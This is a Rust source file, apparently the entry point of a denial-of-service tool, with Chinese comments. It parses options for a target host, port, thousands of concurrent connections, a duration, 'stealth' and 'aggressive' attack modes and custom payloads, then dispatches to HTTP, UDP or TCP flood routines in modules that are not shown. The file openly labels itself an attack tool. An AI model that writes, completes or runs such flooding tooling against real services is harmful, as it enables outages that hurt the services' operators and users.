mod attack;
mod stats;
mod udp_flood;
mod tcp_flood;
mod interactive;
// mod config; // 暂时禁用

use clap::Parser;
use attack::{run_attack, AttackConfig};
use udp_flood::{run_udp_flood, UdpFloodConfig};
use tcp_flood::{run_tcp_flood, TcpFloodConfig};
use interactive::start_interactive_mode;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// 目标IP地址
    #[arg(short, long)]
    target: Option<String>,
    /// 目标端口
    #[arg(short, long, default_value_t = 80)]
    port: u16,
    /// 并发连接数
    #[arg(short, long, default_value_t = 1000)]
    connections: usize,
    /// 请求持续时间（秒）
    #[arg(short, long, default_value_t = 60)]
    duration: u64,
    /// 是否使用HTTPS
    #[arg(long)]
    https: bool,
    /// HTTP方法 (GET/POST)
    #[arg(long, default_value = "GET")]
    method: String,
    /// POST请求的数据
    #[arg(long)]
    post_data: Option<String>,
    /// 自定义User-Agent
    #[arg(long)]
    user_agent: Option<String>,
    /// 攻击模式 (normal/stealth/aggressive)
    #[arg(short, long, default_value = "normal")]
    mode: String,
    /// 攻击类型 (http/udp/tcp)
    #[arg(short, long, default_value = "http")]
    attack_type: String,
    /// 数据包大小
    #[arg(long, default_value_t = 1024)]
    packet_size: usize,
    /// TCP负载类型 (random/http/custom)
    #[arg(long, default_value = "random")]
    payload_type: String,
    /// 自定义TCP负载
    #[arg(long)]
    custom_payload: Option<String>,
    /// 交互模式
    #[arg(short, long)]
    interactive: bool,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    // 交互模式
    if args.interactive {
        start_interactive_mode().await;
        return;
    }

    // 命令行模式
    if let Some(target) = args.target {
        match args.attack_type.to_lowercase().as_str() {
            "http" | "https" => {
                let config = AttackConfig {
                    target: target.clone(),
                    port: args.port,
                    connections: args.connections,
                    duration: args.duration,
                    https: args.https,
                    method: args.method.to_uppercase(),
                    post_data: args.post_data,
                    user_agent: args.user_agent,
                    mode: args.mode,
                };
                run_attack(config).await;
            }
            "udp" => {
                let config = UdpFloodConfig {
                    target: target.clone(),
                    port: args.port,
                    connections: args.connections,
                    duration: args.duration,
                    packet_size: args.packet_size,
                    mode: args.mode,
                };
                run_udp_flood(config).await;
            }
            "tcp" => {
                let config = TcpFloodConfig {
                    target,
                    port: args.port,
                    connections: args.connections,
                    duration: args.duration,
                    packet_size: args.packet_size,
                    mode: args.mode,
                    payload_type: args.payload_type,
                    custom_payload: args.custom_payload,
                };
                run_tcp_flood(config).await;
            }
            _ => {
                eprintln!("❌ 不支持的攻击类型: {}", args.attack_type);
                eprintln!("支持的类型: http, udp, tcp");
            }
        }
    } else {
        eprintln!("❌ 请指定目标IP/域名或使用 --interactive 进入交互模式");
        eprintln!("示例: {} --target 127.0.0.1 --port 8080", std::env::args().next().unwrap());
        eprintln!("或使用: {} --interactive", std::env::args().next().unwrap());
    }
}
